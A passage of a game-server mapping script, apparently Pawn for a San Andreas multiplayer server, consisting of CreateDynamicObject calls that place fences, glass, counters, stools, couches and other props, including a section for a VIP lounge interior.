	CreateDynamicObject(1649, 1470.69921875, -1021.7998046875, 29, 0, 0, 0);
	CreateDynamicObject(1649, 1466.69921875, -1021.7998046875, 29, 0, 0, 0);
	CreateDynamicObject(3440, 1451.19921875, -1021.7998046875, 23.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1455.8994140625, -1021.7998046875, 23.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1460, -1021.7998046875, 23.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1464.69921875, -1021.7998046875, 23.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1468.69921875, -1021.7998046875, 23.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1472.7998046875, -1021.7998046875, 23.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1453.5, -1021.799987793, 30.5, 0, 90, 0);
	CreateDynamicObject(3440, 1470.3994140625, -1021.7998046875, 22.89999961853, 0, 90, 0);
	CreateDynamicObject(3440, 1467, -1021.7998046875, 22.89999961853, 0, 90, 0);
	CreateDynamicObject(3440, 1457.69921875, -1021.7998046875, 22.89999961853, 0, 90, 0);
	CreateDynamicObject(3440, 1453.5, -1021.7998046875, 22.89999961853, 0, 90, 0);
	CreateDynamicObject(3440, 1457.6999511719, -1021.7998046875, 30.5, 0, 90, 0);
	CreateDynamicObject(3440, 1462.3994140625, -1021.7998046875, 27.299999237061, 0, 90, 0);
	CreateDynamicObject(1649, 1453.5, -1021.7998046875, 29, 0, 0, 180);
	CreateDynamicObject(1649, 1451.19921875, -1019.69921875, 25.75, 0, 0, 270);
	CreateDynamicObject(1649, 1451.19921875, -1019.69921875, 25.75, 0, 0, 90);
	CreateDynamicObject(1649, 1453.5, -1021.7998046875, 25.75, 0, 0, 0);
	CreateDynamicObject(1649, 1453.5, -1021.7998046875, 22.5, 0, 0, 0);
	CreateDynamicObject(1649, 1457.8994140625, -1021.7998046875, 29, 0, 0, 179.99450683594);
	CreateDynamicObject(1649, 1457.8994140625, -1021.7998046875, 25.75, 0, 0, 179.99450683594);
	CreateDynamicObject(1649, 1466.69921875, -1021.7998046875, 29, 0, 0, 179.99450683594);
	CreateDynamicObject(1649, 1466.69921875, -1021.7998046875, 25.75, 0, 0, 179.99450683594);
	CreateDynamicObject(1649, 1470.69921875, -1021.7998046875, 25.75, 0, 0, 179.99450683594);
	CreateDynamicObject(1649, 1451.19921875, -1019.69921875, 22.5, 0, 0, 270);
	CreateDynamicObject(1649, 1451.19921875, -1019.69921875, 22.5, 0, 0, 90);
	CreateDynamicObject(1649, 1453.5, -1021.7998046875, 25.75, 0, 0, 179.99450683594);
	CreateDynamicObject(1649, 1453.5, -1021.7998046875, 22.5, 0, 0, 179.99450683594);
	CreateDynamicObject(1649, 1457.8994140625, -1021.7998046875, 25.75, 0, 0, 0);
	CreateDynamicObject(1649, 1457.8994140625, -1021.7998046875, 22.5, 0, 0, 0);
	CreateDynamicObject(1649, 1466.69921875, -1021.7998046875, 25.75, 0, 0, 0);
	CreateDynamicObject(1649, 1466.69921875, -1021.7998046875, 22.5, 0, 0, 0);
	CreateDynamicObject(1649, 1470.69921875, -1021.7998046875, 25.75, 0, 0, 0);
	CreateDynamicObject(1649, 1470.69921875, -1021.7998046875, 22.5, 0, 0, 0);
	CreateDynamicObject(1649, 1462.3000488281, -1021.7998046875, 29, 0, 0, 0);
	CreateDynamicObject(1649, 1462.2998046875, -1021.7998046875, 29, 0, 0, 180);
	CreateDynamicObject(3440, 1467, -1021.7998046875, 30.5, 0, 90, 0);
	CreateDynamicObject(3440, 1470.3994140625, -1021.7998046875, 30.5, 0, 90, 0);
	CreateDynamicObject(1649, 1472.7998046875, -1019.69921875, 29, 0, 0, 270);
	CreateDynamicObject(1649, 1472.7998046875, -1019.69921875, 25.75, 0, 0, 270);
	CreateDynamicObject(1649, 1472.7998046875, -1019.69921875, 25.75, 0, 0, 90);
	CreateDynamicObject(1649, 1472.7998046875, -1019.69921875, 22.5, 0, 0, 90);
	CreateDynamicObject(1649, 1470.4000244141, -1020, 30.799999237061, 80, 180, 180);
	CreateDynamicObject(1649, 1452.9000244141, -1020, 30.799999237061, 99.99755859375, 0, 1);
	CreateDynamicObject(1649, 1470.69921875, -1021.7998046875, 29, 0, 0, 180);
	CreateDynamicObject(1649, 1470.3994140625, -1020, 30.799999237061, 79.996948242188, 179.99450683594, 179.99450683594);
	CreateDynamicObject(1649, 1466, -1020, 30.799999237061, 99.992065429688, 0, 0.999755859375);
	CreateDynamicObject(1649, 1461.599609375, -1020, 30.799999237061, 99.992065429688, 0, 0.999755859375);
	CreateDynamicObject(1649, 1457.19921875, -1020, 30.799999237061, 99.992065429688, 0, 0.999755859375);
	CreateDynamicObject(638, 1433.4000244141, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1436.0999755859, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1438.8000488281, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1441.5, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1444.1999511719, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1446.9000244141, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1449.5999755859, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1474.5999755859, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1477.3000488281, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1480, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1482.6999511719, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1485.4000244141, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1488.0999755859, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(638, 1490.8000488281, -1021.4000244141, 23.700000762939, 0, 0, 90);
	CreateDynamicObject(1214, 1462.4000244141, -1021.799987793, 22.799999237061, 0, 0, 0);
	CreateDynamicObject(7952, 1359.1999511719, -1492.6999511719, 29.799999237061, 0, 0, 0);
	CreateDynamicObject(644, 1437.5999755859, -1018, 24.200000762939, 0, 0, 0);
	CreateDynamicObject(644, 1442, -1018, 24.200000762939, 0, 0, 0);
	CreateDynamicObject(644, 1446.3000488281, -1018, 24.200000762939, 0, 0, 0);
	CreateDynamicObject(644, 1478, -1018.299987793, 24.10000038147, 0, 0, 0);
	CreateDynamicObject(644, 1482.3000488281, -1018.299987793, 24.10000038147, 0, 0, 0);
	CreateDynamicObject(644, 1486.6999511719, -1018.299987793, 24.10000038147, 0, 0, 0);
	CreateDynamicObject(638, 1471.5999755859, -1022.5, 23.5, 0, 0, 90);
	CreateDynamicObject(638, 1468.9000244141, -1022.5, 23.5, 0, 0, 90);
	CreateDynamicObject(638, 1466.1999511719, -1022.5, 23.5, 0, 0, 90);
	CreateDynamicObject(638, 1453, -1022.299987793, 23.5, 0, 0, 90);
	CreateDynamicObject(638, 1455.6999511719, -1022.299987793, 23.5, 0, 0, 90);
	CreateDynamicObject(638, 1458.4000244141, -1022.299987793, 23.5, 0, 0, 90);
	CreateDynamicObject(1616, 1452, -1013.5999755859, 30.200000762939, 0, 0, 186);
	CreateDynamicObject(1616, 1472, -1014.200012207, 30.200000762939, 0, 0, 59.99853515625);
	CreateDynamicObject(1616, 1438, -1043.3000488281, 33, 0, 0, 261.99853515625);
	CreateDynamicObject(1215, 1460, -1019.9000244141, 24.10000038147, 0, 0, 0);
	CreateDynamicObject(1215, 1460, -1015.5999755859, 25.700000762939, 0, 0, 0);
	CreateDynamicObject(1215, 1464.5999755859, -1019.799987793, 24.10000038147, 0, 0, 0);
	CreateDynamicObject(1215, 1464.5999755859, -1015.5999755859, 25.700000762939, 0, 0, 0);
	CreateDynamicObject(2946, 1460.8000488281, -1009.799987793, 25.799999237061, 0, 0, 270);
	CreateDynamicObject(2946, 1464, -1009.7998046875, 25.799999237061, 0, 0, 90);
	CreateDynamicObject(2773, 1460.3000488281, -1011.5999755859, 26.39999961853, 0, 0, 0);
	CreateDynamicObject(2773, 1464.5999755859, -1011.700012207, 26.39999961853, 0, 0, 0);

	//vip lounge
    CreateDynamicObject(8378,2783.24511719,2408.79687500,1238.85534668,90.00000000,179.99450684,179.99450684); //object(vgsbighngrdoor)(1)
	CreateDynamicObject(8378,2783.02050781,2398.24707031,1238.85534668,90.00000000,179.99450684,179.98352051); //object(vgsbighngrdoor)(2)
	CreateDynamicObject(14639,2791.74658203,2411.67407227,1240.83117676,0.00000000,0.00000000,0.00000000); //object(tr_man_main)(1)
	CreateDynamicObject(2367,2785.66162109,2401.78881836,1239.50109863,0.00000000,0.00000000,90.00000000); //object(shop_counter_2)(1)
	CreateDynamicObject(2367,2785.66015625,2403.74072266,1239.50109863,0.00000000,0.00000000,90.00000000); //object(shop_counter_2)(2)
	CreateDynamicObject(2367,2785.73339844,2406.03417969,1239.50109863,0.00000000,0.00000000,90.00000000); //object(shop_counter_2)(3)
	CreateDynamicObject(2367,2785.35498047,2408.48022461,1239.50109863,0.00000000,0.00000000,146.25000000); //object(shop_counter_2)(4)
	CreateDynamicObject(2367,2788.91699219,2412.19091797,1239.50109863,0.00000000,0.00000000,0.00000000); //object(shop_counter_2)(6)
	CreateDynamicObject(2367,2789.62158203,2411.74365234,1239.50109863,0.00000000,0.00000000,0.00000000); //object(shop_counter_2)(8)
	CreateDynamicObject(2367,2791.66015625,2411.77294922,1239.50109863,0.00000000,0.00000000,0.00000000); //object(shop_counter_2)(9)
	CreateDynamicObject(2367,2793.50781250,2411.80859375,1239.50109863,0.00000000,0.00000000,0.00000000); //object(shop_counter_2)(10)
	CreateDynamicObject(3037,2808.32519531,2394.46289062,1241.72961426,0.00000000,0.00000000,0.00000000); //object(warehouse_door2b)(1)
	CreateDynamicObject(3037,2792.66015625,2412.26855469,1241.72961426,0.00000000,0.00000000,90.00000000); //object(warehouse_door2b)(2)
	CreateDynamicObject(3037,2785.11450195,2404.68090820,1241.72961426,0.00000000,0.00000000,0.00000000); //object(warehouse_door2b)(4)
	CreateDynamicObject(3037,2785.14282227,2404.30737305,1241.72961426,0.00000000,0.00000000,0.00000000); //object(warehouse_door2b)(5)
	CreateDynamicObject(3037,2783.94091797,2394.24291992,1241.72961426,0.00000000,0.00000000,0.00000000); //object(warehouse_door2b)(6)
	CreateDynamicObject(3037,2784.58911133,2402.62988281,1241.72961426,0.00000000,0.00000000,0.00000000); //object(warehouse_door2b)(7)
	CreateDynamicObject(3037,2780.07910156,2390.04443359,1241.72961426,0.00000000,0.00000000,90.00000000); //object(warehouse_door2b)(10)
	CreateDynamicObject(3037,2784.13867188,2389.07861328,1241.72961426,0.00000000,0.00000000,90.00000000); //object(warehouse_door2b)(11)
	CreateDynamicObject(3037,2785.13769531,2388.53100586,1241.72961426,0.00000000,0.00000000,90.00000000); //object(warehouse_door2b)(12)
	CreateDynamicObject(3037,2790.27709961,2388.36987305,1241.72961426,0.00000000,0.00000000,90.00000000); //object(warehouse_door2b)(13)
	CreateDynamicObject(3037,2802.30566406,2389.04101562,1238.80969238,0.00000000,0.00000000,90.00000000); //object(warehouse_door2b)(14)
	CreateDynamicObject(3037,2811.39453125,2389.04101562,1241.72961426,0.00000000,0.00000000,90.00000000); //object(warehouse_door2b)(15)
	CreateDynamicObject(3037,2802.09179688,2389.01464844,1245.81933594,0.00000000,0.00000000,90.00000000); //object(warehouse_door2b)(16)
	CreateDynamicObject(1557,2794.23217773,2388.58007812,1239.53112793,0.00000000,0.00000000,0.00000000); //object(gen_doorext19)(1)
	CreateDynamicObject(1557,2794.23144531,2388.58007812,1242.03112793,0.00000000,0.00000000,0.00000000); //object(gen_doorext19)(3)
	CreateDynamicObject(3037,2800.37792969,2389.03662109,1238.80969238,0.00000000,0.00000000,90.00000000); //object(warehouse_door2b)(14)
	CreateDynamicObject(3037,2808.22973633,2402.06494141,1241.72961426,0.00000000,0.00000000,5.50000000); //object(warehouse_door2b)(1)
	CreateDynamicObject(3037,2808.18774414,2403.19165039,1241.72961426,0.00000000,0.00000000,15.49865723); //object(warehouse_door2b)(1)
	CreateDynamicObject(3037,2807.62158203,2405.21508789,1241.72961426,0.00000000,0.00000000,28.49621582); //object(warehouse_door2b)(1)
	CreateDynamicObject(3037,2806.19482422,2407.65747070,1241.72961426,0.00000000,0.00000000,39.49304199); //object(warehouse_door2b)(1)
	CreateDynamicObject(3037,2805.01196289,2409.15185547,1241.72961426,0.00000000,0.00000000,51.49035645); //object(warehouse_door2b)(1)
	CreateDynamicObject(3037,2802.00463867,2411.15405273,1241.72961426,0.00000000,0.00000000,67.98742676); //object(warehouse_door2b)(1)
	CreateDynamicObject(3037,2802.19604492,2412.18774414,1241.72961426,0.00000000,0.00000000,89.00000000); //object(warehouse_door2b)(2)
	CreateDynamicObject(8378,2797.67089844,2398.59960938,1245.84448242,90.00000000,179.99450684,179.99450684); //object(vgsbighngrdoor)(1)
	CreateDynamicObject(8378,2799.55175781,2411.31054688,1245.84448242,90.00000000,179.99450684,179.99450684); //object(vgsbighngrdoor)(1)
	CreateDynamicObject(2367,2797.02856445,2411.85937500,1239.40112305,0.00000000,0.00000000,356.50000000); //object(shop_counter_2)(10)
	CreateDynamicObject(2367,2798.89013672,2411.65283203,1239.40112305,0.00000000,0.00000000,346.74536133); //object(shop_counter_2)(10)
	CreateDynamicObject(2367,2799.80737305,2411.35571289,1239.40112305,0.00000000,0.00000000,342.99499512); //object(shop_counter_2)(10)
	CreateDynamicObject(2367,2801.32983398,2410.95849609,1239.40112305,0.00000000,0.00000000,331.49316406); //object(shop_counter_2)(10)
	CreateDynamicObject(2367,2803.54150391,2409.68872070,1239.40112305,0.00000000,0.00000000,319.24047852); //object(shop_counter_2)(10)
	CreateDynamicObject(2367,2805.15649414,2408.32348633,1239.40112305,0.00000000,0.00000000,302.48522949); //object(shop_counter_2)(10)
	CreateDynamicObject(2367,2806.10351562,2406.79370117,1239.40112305,0.00000000,0.00000000,298.23107910); //object(shop_counter_2)(10)
	CreateDynamicObject(2367,2807.07128906,2404.81079102,1239.40112305,0.00000000,0.00000000,286.97937012); //object(shop_counter_2)(10)
	CreateDynamicObject(2367,2807.68261719,2402.74438477,1239.40112305,0.00000000,0.00000000,275.97937012); //object(shop_counter_2)(10)
	CreateDynamicObject(2367,2807.76220703,2401.86279297,1239.40112305,0.00000000,0.00000000,271.47656250); //object(shop_counter_2)(10)
	CreateDynamicObject(3854,2807.60595703,2400.44873047,1239.53112793,0.00000000,0.00000000,0.00000000); //object(gay_telgrphpole)(1)
	CreateDynamicObject(3854,2807.54174805,2400.96850586,1239.53112793,0.00000000,0.00000000,0.00000000); //object(gay_telgrphpole)(2)
	CreateDynamicObject(3854,2807.66699219,2400.67333984,1239.53112793,0.00000000,0.00000000,0.00000000); //object(gay_telgrphpole)(3)
	CreateDynamicObject(3854,2808.34960938,2400.29492188,1239.53112793,0.00000000,0.00000000,0.00000000); //object(gay_telgrphpole)(4)
	CreateDynamicObject(3854,2807.98095703,2400.43408203,1239.53112793,0.00000000,0.00000000,0.00000000); //object(gay_telgrphpole)(5)
	CreateDynamicObject(3854,2808.13964844,2400.99804688,1239.53112793,0.00000000,0.00000000,0.00000000); //object(gay_telgrphpole)(6)
	CreateDynamicObject(1557,2785.17285156,2388.63671875,1242.03112793,0.00000000,0.00000000,90.24853516); //object(gen_doorext19)(5)
	CreateDynamicObject(1557,2785.15771484,2388.64892578,1239.53112793,0.00000000,0.00000000,89.99853516); //object(gen_doorext19)(6)
	CreateDynamicObject(3037,2788.37548828,2413.18457031,1241.72961426,0.00000000,0.00000000,126.50000000); //object(warehouse_door2b)(2)
	CreateDynamicObject(3037,2785.93969727,2411.70190430,1241.72961426,0.00000000,0.00000000,151.24658203); //object(warehouse_door2b)(2)
	CreateDynamicObject(3854,2797.07617188,2411.26171875,1239.53112793,0.00000000,0.00000000,313.74755859); //object(gay_telgrphpole)(7)
	CreateDynamicObject(3854,2796.77734375,2411.25292969,1239.53112793,0.00000000,0.00000000,313.74755859); //object(gay_telgrphpole)(8)
	CreateDynamicObject(3854,2796.40234375,2411.26660156,1239.53112793,0.00000000,0.00000000,313.74206543); //object(gay_telgrphpole)(9)
	CreateDynamicObject(3854,2796.39794922,2412.05029297,1239.53112793,0.00000000,0.00000000,313.74755859); //object(gay_telgrphpole)(10)
	CreateDynamicObject(3854,2796.39697266,2411.70947266,1239.53112793,0.00000000,0.00000000,313.74755859); //object(gay_telgrphpole)(11)
	CreateDynamicObject(3854,2797.14160156,2411.71044922,1239.53112793,0.00000000,0.00000000,313.74755859); //object(gay_telgrphpole)(12)
	CreateDynamicObject(3854,2797.07104492,2412.25317383,1239.53112793,0.00000000,0.00000000,313.74755859); //object(gay_telgrphpole)(13)
	CreateDynamicObject(4028,2772.93994141,2325.31835938,1240.77282715,0.00000000,0.00000000,126.00000000); //object(lanstap)(2)
	CreateDynamicObject(4033,2714.31811523,2331.49536133,1226.63452148,0.00000000,0.00000000,0.00000000); //object(fightplaza1_lan)(1)
	CreateDynamicObject(4141,2714.29467773,2316.75903320,1244.14880371,0.00000000,0.00000000,0.00000000); //object(hotelexterior1_lan)(1)
	CreateDynamicObject(5408,2865.92114258,2292.19921875,1248.68542480,0.00000000,0.00000000,0.00000000); //object(laeexaminerbuild1)(1)
	CreateDynamicObject(5476,2875.73803711,2399.84887695,1234.00378418,0.00000000,0.00000000,0.00000000); //object(laeidleproj01)(2)
	CreateDynamicObject(4019,2772.02539062,2201.21777344,1226.07568359,0.00000000,0.00000000,0.00000000); //object(newbuildsm01)(1)
	CreateDynamicObject(4079,2799.79101562,2407.20996094,1242.81372070,0.00000000,0.00000000,267.99499512); //object(twintjail1_lan)(1)
	CreateDynamicObject(3984,2775.56787109,2327.20361328,1237.12023926,0.00000000,0.00000000,0.00000000); //object(churchprog1_lan)(1)
	CreateDynamicObject(4000,2779.60498047,2408.78369141,1225.83374023,0.00000000,0.00000000,0.00000000); //object(twintjail2_lan)(1)
	CreateDynamicObject(5474,2924.07031250,2396.92065430,1226.15185547,0.00000000,0.00000000,0.00000000); //object(laeidlewood02)(1)
	CreateDynamicObject(4156,2732.26074219,2372.28515625,1226.30834961,0.00000000,0.00000000,0.00000000); //object(roads17_lan)(2)
	CreateDynamicObject(4125,2758.75415039,2468.06909180,1231.06738281,0.00000000,0.00000000,0.00000000); //object(gsfreeway1_lan)(1)
	CreateDynamicObject(6123,2741.86816406,2274.62622070,1226.15930176,0.00000000,0.00000000,0.00000000); //object(lawroads_law17)(2)
	CreateDynamicObject(6121,2814.07568359,2352.91967773,1226.34643555,0.00000000,0.00000000,270.00000000); //object(lawroads_law15)(1)
	CreateDynamicObject(6117,2862.17993164,2362.10473633,1226.35290527,0.00000000,0.00000000,0.00000000); //object(lawroads_law11)(1)
	CreateDynamicObject(6121,2816.98437500,2430.84741211,1226.34643555,0.00000000,0.00000000,270.00000000); //object(lawroads_law15)(2)
	CreateDynamicObject(4079,2755.83789062,2405.47851562,1242.71362305,0.00000000,0.00000000,87.98950195); //object(twintjail1_lan)(1)
	CreateDynamicObject(6121,2814.03857422,2213.08740234,1226.34643555,0.00000000,0.00000000,270.00000000); //object(lawroads_law15)(4)
	CreateDynamicObject(6117,2813.95507812,2274.86523438,1226.35290527,0.00000000,0.00000000,270.00000000); //object(lawroads_law11)(3)
	CreateDynamicObject(6117,2861.88159180,2222.50488281,1226.35290527,0.00000000,0.00000000,180.00000000); //object(lawroads_law11)(4)
	CreateDynamicObject(6117,2770.79345703,2242.87500000,1226.35290527,0.00000000,0.00000000,179.99450684); //object(lawroads_law11)(5)
	CreateDynamicObject(4027,2775.59765625,2272.69677734,1228.29064941,0.00000000,0.00000000,0.00000000); //object(langrasspatch)(1)
	CreateDynamicObject(4018,2784.31054688,2258.12451172,1226.47509766,0.00000000,0.00000000,0.00000000); //object(newbuildsm02)(1)
	CreateDynamicObject(5725,2854.03125000,2207.83813477,1235.39550781,0.00000000,0.00000000,0.00000000); //object(holpacific2_law)(1)
	CreateDynamicObject(5725,2833.26318359,2168.41357422,1235.39550781,0.00000000,0.00000000,0.00000000); //object(holpacific2_law)(2)
	CreateDynamicObject(5725,2828.74462891,2174.39013672,1235.39550781,0.00000000,0.00000000,90.00000000); //object(holpacific2_law)(3)
	CreateDynamicObject(1846,2807.22558594,2394.47656250,1242.29052734,90.00000000,179.99450684,269.99450684); //object(shop_shelf04)(5)
	CreateDynamicObject(1846,2807.22558594,2394.47656250,1242.29052734,90.00000000,179.99450684,269.99450684); //object(shop_shelf04)(6)
	CreateDynamicObject(1846,2807.22558594,2394.47656250,1242.29052734,90.00000000,179.99450684,269.99450684); //object(shop_shelf04)(7)
	CreateDynamicObject(18090,2791.54980469,2410.13671875,1242.09448242,0.00000000,0.00000000,90.00000000); //object(bar_bar1)(1)
	CreateDynamicObject(1649,2784.57153320,2405.92651367,1242.09692383,270.00000000,180.00000000,89.99923706); //object(wglasssmash)(1)
	CreateDynamicObject(1649,2784.56396484,2403.42846680,1242.09692383,270.00000000,179.99450684,89.99450684); //object(wglasssmash)(2)
	CreateDynamicObject(1518,2785.08325195,2407.61010742,1241.33691406,0.00000000,0.00000000,90.00000000); //object(dyn_tv_2)(1)
	CreateDynamicObject(1518,2785.10742188,2404.98974609,1241.33691406,0.00000000,0.00000000,90.00000000); //object(dyn_tv_2)(2)
	CreateDynamicObject(1518,2785.08471680,2401.91406250,1241.33691406,0.00000000,0.00000000,90.00000000); //object(dyn_tv_2)(3)
	CreateDynamicObject(1716,2795.83032227,2408.04321289,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(1)
	CreateDynamicObject(1716,2794.69970703,2408.02954102,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(2)
	CreateDynamicObject(1716,2793.31811523,2407.98242188,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(3)
	CreateDynamicObject(1716,2791.84155273,2407.92749023,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(4)
	CreateDynamicObject(1716,2790.09545898,2407.87158203,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(5)
	CreateDynamicObject(1716,2787.36865234,2408.00561523,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(6)
	CreateDynamicObject(1716,2787.41064453,2406.68554688,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(7)
	CreateDynamicObject(1716,2787.36914062,2405.31640625,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(8)
	CreateDynamicObject(1716,2787.37963867,2403.93701172,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(9)
	CreateDynamicObject(1716,2787.32519531,2402.48437500,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_slot_stool)(10)
	CreateDynamicObject(1665,2785.61328125,2407.02905273,1240.56286621,0.00000000,0.00000000,0.00000000); //object(propashtray1)(1)
	CreateDynamicObject(1665,2785.98754883,2404.33642578,1240.56286621,0.00000000,0.00000000,0.00000000); //object(propashtray1)(2)
	CreateDynamicObject(1665,2786.06811523,2401.39111328,1240.56286621,0.00000000,0.00000000,138.00000000); //object(propashtray1)(3)
	CreateDynamicObject(1548,2785.28466797,2406.21289062,1240.55468750,0.00000000,0.00000000,0.00000000); //object(cj_drip_tray)(1)
	CreateDynamicObject(1548,2785.26513672,2402.81811523,1240.55468750,0.00000000,0.00000000,0.00000000); //object(cj_drip_tray)(2)
	CreateDynamicObject(1551,2785.50585938,2407.99951172,1240.78259277,0.00000000,0.00000000,0.00000000); //object(dyn_wine_big)(1)
	CreateDynamicObject(1543,2785.77758789,2402.04467773,1240.54235840,0.00000000,0.00000000,0.00000000); //object(cj_beer_b_2)(1)
	CreateDynamicObject(1703,2799.90625000,2390.71191406,1239.49047852,0.00000000,0.00000000,179.99450684); //object(swank_couch_1)(1)
	CreateDynamicObject(1703,2796.70312500,2391.98242188,1239.49047852,0.00000000,0.00000000,90.00000000); //object(swank_couch_1)(2)
	CreateDynamicObject(1703,2796.70312500,2395.75585938,1239.49047852,0.00000000,0.00000000,90.00000000); //object(swank_couch_1)(3)
	CreateDynamicObject(1703,2798.08496094,2398.72656250,1239.49047852,0.00000000,0.00000000,0.00000000); //object(swank_couch_1)(4)
	CreateDynamicObject(1703,2805.83886719,2390.66210938,1239.49047852,0.00000000,0.00000000,179.99450684); //object(swank_couch_1)(5)
	CreateDynamicObject(1703,2803.88378906,2398.74121094,1239.49047852,0.00000000,0.00000000,0.00000000); //object(swank_couch_1)(6)
	CreateDynamicObject(3533,2795.77441406,2399.73144531,1243.77673340,0.00000000,0.00000000,0.00000000); //object(trdpillar01)(1)
	CreateDynamicObject(2236,2801.35351562,2390.20043945,1239.53112793,0.00000000,0.00000000,0.00000000); //object(coffee_swank_1)(1)
	CreateDynamicObject(2236,2798.57568359,2396.62695312,1239.53112793,0.00000000,0.00000000,0.00000000); //object(coffee_swank_1)(2)
	CreateDynamicObject(2236,2797.61718750,2393.25244141,1239.53112793,0.00000000,0.00000000,270.25000000); //object(coffee_swank_1)(3)
	CreateDynamicObject(1649,2799.71655273,2388.99877930,1242.13415527,0.00000000,0.00000000,180.00000000); //object(wglasssmash)(1)
	CreateDynamicObject(1649,2804.10473633,2388.99975586,1242.13415527,0.00000000,0.00000000,179.99450684); //object(wglasssmash)(2)
	CreateDynamicObject(2898,2804.73120117,2389.10864258,1241.96386719,359.75000000,89.98983765,270.00000000); //object(funturf_law)(4)
	CreateDynamicObject(2898,2799.32568359,2389.11669922,1241.96386719,359.74731445,89.98901367,269.99450684); //object(funturf_law)(5)
	CreateDynamicObject(2755,2795.38403320,2391.57495117,1241.26257324,0.00000000,0.00000000,269.99996948); //object(dojo_wall)(1)
	CreateDynamicObject(2755,2795.41625977,2397.44750977,1241.26257324,0.00000000,0.00000000,269.99450684); //object(dojo_wall)(2)
	CreateDynamicObject(2755,2798.25195312,2400.01684570,1241.26257324,0.00000000,0.00000000,179.99450684); //object(dojo_wall)(3)
	CreateDynamicObject(2755,2805.85229492,2400.03076172,1241.26257324,0.00000000,0.00000000,179.99450684); //object(dojo_wall)(4)
	CreateDynamicObject(2395,2795.35937500,2398.84057617,1242.23107910,0.00000000,90.00000000,269.99890137); //object(cj_sports_wall)(1)
	CreateDynamicObject(2395,2795.47705078,2396.08935547,1242.23107910,0.00000000,90.00000000,89.99203491); //object(cj_sports_wall)(2)
	CreateDynamicObject(2395,2795.33642578,2392.94360352,1242.23107910,0.00000000,90.00000000,269.99450684); //object(cj_sports_wall)(3)
	CreateDynamicObject(2395,2795.44580078,2390.18725586,1242.23107910,0.00000000,90.00000000,89.98901367); //object(cj_sports_wall)(4)
	CreateDynamicObject(3533,2795.41381836,2389.39672852,1243.77673340,0.00000000,0.00000000,0.00000000); //object(trdpillar01)(1)
	CreateDynamicObject(2395,2796.85400391,2399.93212891,1242.23107910,0.00000000,90.00000000,0.00000000); //object(cj_sports_wall)(5)
	CreateDynamicObject(2395,2799.59814453,2400.07226562,1242.23107910,0.00000000,90.00000000,180.00000000); //object(cj_sports_wall)(6)
	CreateDynamicObject(2395,2807.31396484,2400.06567383,1242.23107910,0.00000000,90.00000000,179.99450684); //object(cj_sports_wall)(7)
	CreateDynamicObject(2395,2804.48632812,2399.96484375,1242.23107910,0.00000000,90.00000000,0.00000000); //object(cj_sports_wall)(10)
	CreateDynamicObject(2231,2808.53466797,2392.17211914,1242.00842285,0.00000000,0.00000000,270.25000000); //object(swank_speaker_3)(1)
	CreateDynamicObject(2231,2808.43090820,2396.36840820,1242.00842285,0.00000000,0.00000000,270.24719238); //object(swank_speaker_3)(2)
	CreateDynamicObject(2230,2808.45214844,2394.35937500,1239.53112793,0.00000000,90.00000000,270.00000000); //object(swank_speaker_2)(1)
	CreateDynamicObject(2230,2808.45776367,2394.35888672,1240.13110352,180.00000000,90.00000000,90.00549316); //object(swank_speaker_2)(2)
	CreateDynamicObject(2230,2808.08081055,2388.95214844,1239.53112793,0.00000000,0.00000000,231.99998474); //object(swank_speaker_2)(3)
	CreateDynamicObject(2230,2808.41748047,2400.06494141,1239.53112793,0.00000000,0.00000000,325.99832153); //object(swank_speaker_2)(4)
	CreateDynamicObject(1670,2798.70971680,2397.14965820,1240.05664062,0.00000000,0.00000000,81.75000000); //object(propcollecttable)(1)
	CreateDynamicObject(1670,2798.24169922,2392.70068359,1240.05664062,0.00000000,0.00000000,81.74926758); //object(propcollecttable)(2)
	CreateDynamicObject(1235,2795.78417969,2411.50341797,1240.03417969,0.00000000,0.00000000,0.00000000); //object(wastebin)(1)
	CreateDynamicObject(2109,2803.70239258,2403.28247070,1239.92224121,0.00000000,0.00000000,0.00000000); //object(low_dinning_3)(1)
	CreateDynamicObject(1704,2803.28930664,2405.13476562,1239.53112793,0.00000000,0.00000000,0.00000000); //object(kb_chair03)(1)
	CreateDynamicObject(1704,2805.60058594,2403.64990234,1239.53112793,0.00000000,0.00000000,270.50000000); //object(kb_chair03)(2)
	CreateDynamicObject(1704,2804.23046875,2401.51000977,1239.53112793,0.00000000,0.00000000,179.24987793); //object(kb_chair03)(3)
	CreateDynamicObject(1704,2801.83837891,2402.81372070,1239.53112793,0.00000000,0.00000000,89.74740601); //object(kb_chair03)(4)
	CreateDynamicObject(1704,2797.39550781,2404.42773438,1239.53112793,0.00000000,0.00000000,358.25000000); //object(kb_chair03)(5)
